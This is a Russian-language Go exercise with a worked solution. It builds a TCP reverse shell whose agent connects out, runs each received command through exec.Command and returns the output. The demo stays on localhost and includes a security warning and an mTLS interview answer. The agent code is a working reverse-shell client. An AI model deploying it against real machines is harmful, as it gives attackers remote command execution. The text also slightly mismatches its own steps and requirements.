# Учебный протокол удаленного выполнения команд (Remote Command Exec / Reverse TCP)

## Условие

Напиши **TCP reverse shell** (учебный): сервер отправляет команду, клиент выполняет её через `exec.Command`, возвращает stdout+stderr. Используй `bufio.Scanner` для чтения команд и `io.Copy` для вывода.

## Теория

Протокол удаленного администрирования (Remote Execution): сервер передает текстовую команду, агент выполняет локальную системную утилиту и перенаправляет потоки `stdout`/`stderr` обратно в TCP-сокет.

## Решение по шагам

1. Запустим командный сервер.
2. Агент подключается по TCP.
3. Сервер отправляет команду `"echo Golang_TCP_Agent"`.
4. Агент выполняет команду и возвращает вывод в сокет.

## Код решения

**`main.go`**

```go
package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

func runRemoteAgent(serverAddr string) {
	conn, err := net.Dial("tcp", serverAddr)
	if err != nil {
		return
	}
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		cmdLine := strings.TrimSpace(scanner.Text())
		if cmdLine == "EXIT" {
			return
		}

		parts := strings.Fields(cmdLine)
		if len(parts) == 0 {
			continue
		}

		// Выполняем системную команду
		cmd := exec.Command(parts[0], parts[1:]...)
		output, err := cmd.CombinedOutput()
		if err != nil {
			_, _ = conn.Write([]byte(fmt.Sprintf("ERR: %v\n", err)))
		} else {
			_, _ = conn.Write(output)
			_, _ = conn.Write([]byte("\n---END---\n"))
		}
	}
}

func main() {
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		panic(err)
	}
	defer l.Close()

	// Запуск управляющего сервера
	go func() {
		conn, err := l.Accept()
		if err != nil {
			return
		}
		defer conn.Close()

		// Отправляем команду агенту
		_, _ = conn.Write([]byte("echo Hello_From_Agent\n"))

		reader := bufio.NewReader(conn)
		for {
			line, err := reader.ReadString('\n')
			if err != nil || strings.TrimSpace(line) == "---END---" {
				break
			}
			fmt.Printf("[Command Result] %s", line)
		}
	}()

	time.Sleep(10 * time.Millisecond)

	// Запуск клиентского агента
	runRemoteAgent(l.Addr().String())
}
```

**`Терминал`**

```bash
go run main.go
# Вывод:
# [Command Result] Hello_From_Agent
```

## Под капотом

`cmd.CombinedOutput()` перехватывает файловые дескрипторы 1 (stdout) и 2 (stderr) дочернего процесса.

## Подводные камни

Никогда не выполняйте `exec.Command` с непроверенным пользовательским вводом в публичной сети без аутентификации и изоляции (sandbox).

## На собеседовании

**Вопрос с собеседования:** «Как защитить сетевой протокол удаленного управления от перехвата и подделки?»
**Ответ:** Использовать mTLS (Mutual TLS): сокет оборачивается в `crypto/tls`, где и клиент, и сервер взаимно проверяют X.509 сертификаты и шифруют трафик шифрами AES-GCM / ChaCha20-Poly1305.
